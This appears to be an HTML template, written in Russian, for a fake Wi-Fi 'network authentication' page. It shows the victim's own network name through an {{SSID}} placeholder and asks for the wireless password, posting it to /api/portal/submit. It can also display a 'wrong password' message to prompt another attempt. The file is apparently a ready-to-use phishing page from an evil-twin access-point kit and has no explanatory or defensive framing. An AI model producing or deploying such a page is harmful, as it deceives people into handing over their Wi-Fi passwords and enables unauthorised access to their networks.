<!DOCTYPE html>
<html lang="ru">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">
<title>Wi-Fi — Подключение</title>
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{background:#f0f4f8;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Arial,sans-serif;display:flex;align-items:center;justify-content:center;min-height:100vh;padding:20px}
.card{background:#fff;border-radius:16px;padding:32px 26px;width:100%;max-width:380px;box-shadow:0 4px 28px rgba(0,0,0,.1)}
.wifi-icon{text-align:center;margin-bottom:20px}
.wifi-icon svg{width:52px;height:52px}
h2{font-size:18px;color:#1a202c;font-weight:700;text-align:center;margin-bottom:6px}
.sub{font-size:13px;color:#718096;text-align:center;margin-bottom:6px;line-height:1.5}
.ssid-badge{display:inline-block;background:#EBF4FF;color:#2B6CB0;border-radius:20px;padding:4px 14px;font-size:12px;font-weight:700;margin:0 auto 22px;text-align:center;display:block;width:fit-content;margin-left:auto;margin-right:auto}
.field{margin-bottom:14px}
.field label{display:block;font-size:12px;color:#4a5568;margin-bottom:5px;font-weight:600;letter-spacing:.3px}
input[type=text],input[type=password]{width:100%;padding:11px 14px;border:1.5px solid #e2e8f0;border-radius:9px;font-size:14px;color:#2d3748;background:#f7fafc;outline:none;-webkit-appearance:none}
input[type=text]:focus,input[type=password]:focus{border-color:#3182CE;background:#fff;box-shadow:0 0 0 2px rgba(49,130,206,.12)}
input[readonly]{color:#a0aec0}
.btn{width:100%;padding:13px;background:#3182CE;color:#fff;border:none;border-radius:9px;font-size:15px;font-weight:700;cursor:pointer;margin-top:6px;-webkit-appearance:none;position:relative}
.btn:active{background:#2c5282}
.spin{display:none;position:absolute;right:16px;top:50%;transform:translateY(-50%);width:18px;height:18px;border:2px solid rgba(255,255,255,.3);border-top-color:#fff;border-radius:50%;animation:sp .7s linear infinite}
@keyframes sp{to{transform:translateY(-50%) rotate(360deg)}}
.error{display:none;background:#fff5f5;border:1px solid #fed7d7;border-radius:8px;padding:10px 12px;font-size:12px;color:#c53030;margin-top:10px;text-align:center}
.note{font-size:11px;color:#a0aec0;text-align:center;margin-top:14px;line-height:1.5}
</style>
</head>
<body>
<div class="card">
  <div class="wifi-icon">
    <svg viewBox="0 0 52 52" fill="none" xmlns="http://www.w3.org/2000/svg">
      <circle cx="26" cy="26" r="25" fill="#EBF4FF" stroke="#3182CE" stroke-width="1.5"/>
      <path d="M10 22c8.8-8.8 23.2-8.8 32 0" stroke="#3182CE" stroke-width="2.5" stroke-linecap="round" fill="none"/>
      <path d="M15.5 27.5c5.8-5.8 15.2-5.8 21 0" stroke="#3182CE" stroke-width="2.5" stroke-linecap="round" fill="none"/>
      <path d="M21 33c2.8-2.8 8.2-2.8 11 0" stroke="#3182CE" stroke-width="2.5" stroke-linecap="round" fill="none"/>
      <circle cx="26" cy="38" r="2.5" fill="#3182CE"/>
    </svg>
  </div>
  <h2>Аутентификация сети</h2>
  <p class="sub">Сеть требует подтверждения</p>
  <div class="ssid-badge">&#128246; {{SSID}}</div>
  <form method="POST" action="/api/portal/submit" id="frm">
    <input type="hidden" name="ssid" value="{{SSID}}">
    <input type="hidden" name="vendor" value="generic">
    <div class="field">
      <label>Имя сети</label>
      <input type="text" value="{{SSID}}" readonly>
    </div>
    <div class="field">
      <label>Пароль Wi-Fi</label>
      <input type="password" name="password" placeholder="Введите пароль" required autocomplete="off" minlength="8">
    </div>
    <button type="submit" class="btn" id="sbtn">
      Подключиться
      <div class="spin" id="sp"></div>
    </button>
  </form>
  <div class="error" id="err">Неверный пароль. Попробуйте ещё раз.</div>
  <p class="note">Для доступа к интернету необходимо подтвердить пароль беспроводной сети</p>
</div>
<script>
document.getElementById('frm').addEventListener('submit',function(){
  document.getElementById('sp').style.display='block';
  document.getElementById('sbtn').disabled=true;
});
if(new URLSearchParams(location.search).get('err')){document.getElementById('err').style.display='block';}
</script>
</body>
</html>
